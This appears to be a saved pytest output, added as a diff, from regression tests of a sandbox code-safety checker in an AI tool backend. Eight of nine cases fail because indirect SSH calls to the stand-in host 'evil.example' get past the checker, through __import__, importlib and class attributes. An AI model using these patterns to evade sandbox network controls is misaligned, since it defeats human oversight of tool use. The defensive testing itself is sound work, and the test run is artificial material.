@@ -1,0 +1,58 @@
+FFFFFFFF.                                                                [100%]
+=================================== FAILURES ===================================
+_ test_imported_and_class_clients_require_approval[__import__('paramiko').SSHClient().connect(hostname='evil.example')] _
+/evidence/round16_regressions.py:17: in test_imported_and_class_clients_require_approval
+    assert _check_code_safety(code,session_id='round16') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("__import__('paramiko').SSHClient().connect(hostname='evil.example')", session_id='round16')
+_ test_imported_and_class_clients_require_approval[import importlib; importlib.import_module('paramiko').SSHClient().connect(hostname='evil.example')] _
+/evidence/round16_regressions.py:17: in test_imported_and_class_clients_require_approval
+    assert _check_code_safety(code,session_id='round16') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import importlib; importlib.import_module('paramiko').SSHClient().connect(hostname='evil.example')", session_id='round16')
+_ test_imported_and_class_clients_require_approval[from importlib import import_module as load; p=load('paramiko'); c=p.SSHClient(); c.connect(hostname='evil.example')] _
+/evidence/round16_regressions.py:17: in test_imported_and_class_clients_require_approval
+    assert _check_code_safety(code,session_id='round16') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("from importlib import import_module as load; p=load('paramiko'); c=p.SSHClient(); c.connect(hostname='evil.example')", session_id='round16')
+_ test_imported_and_class_clients_require_approval[p=__import__('paramiko'); c=p.SSHClient(); c.connect(hostname='evil.example')] _
+/evidence/round16_regressions.py:17: in test_imported_and_class_clients_require_approval
+    assert _check_code_safety(code,session_id='round16') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("p=__import__('paramiko'); c=p.SSHClient(); c.connect(hostname='evil.example')", session_id='round16')
+_ test_imported_and_class_clients_require_approval[import importlib as il; il.import_module('asyncssh').connect('evil.example',config=None)] _
+/evidence/round16_regressions.py:19: in test_imported_and_class_clients_require_approval
+    assert _check_code_safety(code,session_id='round16') is None
+E   assert 'Error: unsafe code detected (Blocked: host not in sandbox allowlist; use an allowed informational source). Please remove unsafe patterns from your code.' is None
+E    +  where 'Error: unsafe code detected (Blocked: host not in sandbox allowlist; use an allowed informational source). Please remove unsafe patterns from your code.' = _check_code_safety("import importlib as il; il.import_module('asyncssh').connect('evil.example',config=None)", session_id='round16')
+_ test_imported_and_class_clients_require_approval[import paramiko\nclass Pool: client=paramiko.SSHClient()\nPool.client.connect(hostname='evil.example')] _
+/evidence/round16_regressions.py:17: in test_imported_and_class_clients_require_approval
+    assert _check_code_safety(code,session_id='round16') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\nclass Pool: client=paramiko.SSHClient()\nPool.client.connect(hostname='evil.example')", session_id='round16')
+_ test_imported_and_class_clients_require_approval[import paramiko\nclass Outer:\n class Pool: client=paramiko.SSHClient()\nOuter.Pool.client.connect(hostname='evil.example')] _
+/evidence/round16_regressions.py:17: in test_imported_and_class_clients_require_approval
+    assert _check_code_safety(code,session_id='round16') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\nclass Outer:\n class Pool: client=paramiko.SSHClient()\nOuter.Pool.client.connect(hostname='evil.example')", session_id='round16')
+_ test_imported_and_class_clients_require_approval[import paramiko\nclass Pool: clients=[paramiko.SSHClient()]\nPool.clients[0].connect(hostname='evil.example')] _
+/evidence/round16_regressions.py:19: in test_imported_and_class_clients_require_approval
+    assert _check_code_safety(code,session_id='round16') is None
+E   assert 'Error: unsafe code detected (Blocked: SSH usage with a non-literal host or indirect connection settings is not allowe...nfig=None for AsyncSSH, or config=fabric.Config(lazy=True) for Fabric.). Please remove unsafe patterns from your code.' is None
+E    +  where 'Error: unsafe code detected (Blocked: SSH usage with a non-literal host or indirect connection settings is not allowe...nfig=None for AsyncSSH, or config=fabric.Config(lazy=True) for Fabric.). Please remove unsafe patterns from your code.' = _check_code_safety("import paramiko\nclass Pool: clients=[paramiko.SSHClient()]\nPool.clients[0].connect(hostname='evil.example')", session_id='round16')
+=============================== warnings summary ===============================
+studio/backend/core/inference/tool_confinement.py:262
+  /work/studio/backend/core/inference/tool_confinement.py:262: DeprecationWarning: Due to '_pack_', the '_PathBeneathAttr' Structure will use memory layout compatible with MSVC (Windows). If this is intended, set _layout_ to 'ms'. The implicit default is deprecated and slated to become an error in Python 3.19.
+    class _PathBeneathAttr(ctypes.Structure):
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=========================== short test summary info ============================
+FAILED ../evidence/round16_regressions.py::test_imported_and_class_clients_require_approval[__import__('paramiko').SSHClient().connect(hostname='evil.example')]
+FAILED ../evidence/round16_regressions.py::test_imported_and_class_clients_require_approval[import importlib; importlib.import_module('paramiko').SSHClient().connect(hostname='evil.example')]
+FAILED ../evidence/round16_regressions.py::test_imported_and_class_clients_require_approval[from importlib import import_module as load; p=load('paramiko'); c=p.SSHClient(); c.connect(hostname='evil.example')]
+FAILED ../evidence/round16_regressions.py::test_imported_and_class_clients_require_approval[p=__import__('paramiko'); c=p.SSHClient(); c.connect(hostname='evil.example')]
+FAILED ../evidence/round16_regressions.py::test_imported_and_class_clients_require_approval[import importlib as il; il.import_module('asyncssh').connect('evil.example',config=None)]
+FAILED ../evidence/round16_regressions.py::test_imported_and_class_clients_require_approval[import paramiko\nclass Pool: client=paramiko.SSHClient()\nPool.client.connect(hostname='evil.example')]
+FAILED ../evidence/round16_regressions.py::test_imported_and_class_clients_require_approval[import paramiko\nclass Outer:\n class Pool: client=paramiko.SSHClient()\nOuter.Pool.client.connect(hostname='evil.example')]
+FAILED ../evidence/round16_regressions.py::test_imported_and_class_clients_require_approval[import paramiko\nclass Pool: clients=[paramiko.SSHClient()]\nPool.clients[0].connect(hostname='evil.example')]
+8 failed, 1 passed, 1 warning in 0.13s
